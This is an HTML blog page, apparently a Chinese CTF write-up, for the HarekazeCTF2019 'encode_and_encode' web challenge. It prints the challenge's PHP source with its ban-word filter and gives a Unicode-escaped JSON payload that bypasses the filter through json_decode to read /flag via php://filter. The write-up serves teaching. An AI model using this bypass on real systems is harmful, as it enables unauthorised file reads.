@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="checkline直接给了源码 审计12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET[&amp;#x27;source&amp;#x27;])) &amp;#123;  show_source(__FILE__);  exit();&amp;#125;f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞">
+<meta property="og:url" content="http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="checkline直接给了源码 审计12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET[&amp;#x27;source&amp;#x27;])) &amp;#123;  show_source(__FILE__);  exit();&amp;#125;f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2022-06-02-20-07-23.png">
+<meta property="article:published_time" content="2022-06-02T08:08:02.000Z">
+<meta property="article:modified_time" content="2022-06-02T12:52:35.846Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="json">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2022-06-02-20-07-23.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/06/03/BUUCTF-WEB-RootersCTF2019-I-3-Flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8F%82%E6%95%B0%E7%88%86%E7%A0%B4-arjun/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/06/02/BUUCTF-WEB-%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-php%E7%BB%95%E7%BB%95%E8%BF%87-%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%8E%B7%E5%8F%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&text=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&is_video=false&description=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞&body=Check out this article: http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&name=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&t=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkline"><span class="toc-number">1.</span> <span class="toc-text">checkline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attack"><span class="toc-number">3.</span> <span class="toc-text">attack</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-02T08:08:02.000Z" itemprop="datePublished">2022-06-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link-link" href="/tags/json/" rel="tag">json</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="checkline"><a href="#checkline" class="headerlink" title="checkline"></a>checkline</h2><p>直接给了源码</p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//post数据给了body</span></span><br><span class="line"><span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>, <span class="literal">true</span>);<span class="comment">//body数据解析给了json</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_valid</span>(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;<span class="comment">//检查了body，但是没有检查json，检查了个寂寞</span></span><br><span class="line">  <span class="variable">$page</span> = <span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$page</span>);<span class="comment">//通过json获取文件内容，但是没有并没有检查json。</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$content</span> || !<span class="title function_ invoke__">is_valid</span>(<span class="variable">$content</span>)) &#123;<span class="comment">//检查了文件内容，所以假如文件内容有关键字的话，也要处理一下</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$content</span>]);<span class="comment">//输出文件内容。</span></span><br></pre></td></tr></table></figure>
+<h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>由于json_decode会自动解析unicode，所以可以使用unicode绕过。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">最终构造为</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">解释一下</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span><span class="punctuation">&#125;</span><span class="comment">//因为content会再次check所以使用base64再次加密</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2022-06-02-20-07-23.png"></p>
+<p>unicode编码<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/Unicode.htm">https://www.qqxiuzi.cn/bianma/Unicode.htm</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkline"><span class="toc-number">1.</span> <span class="toc-text">checkline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attack"><span class="toc-number">3.</span> <span class="toc-text">attack</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&text=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&is_video=false&description=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞&body=Check out this article: http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&title=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&name=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/02/BUUCTF-WEB-HarekazeCTF2019-encode-and-encode-json-decode%E4%BC%9A%E8%BD%AC%E5%8C%96unicode-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/&t=BUUCTF-WEB-HarekazeCTF2019-encode_and_encode-json_decode会转化unicode-逻辑漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
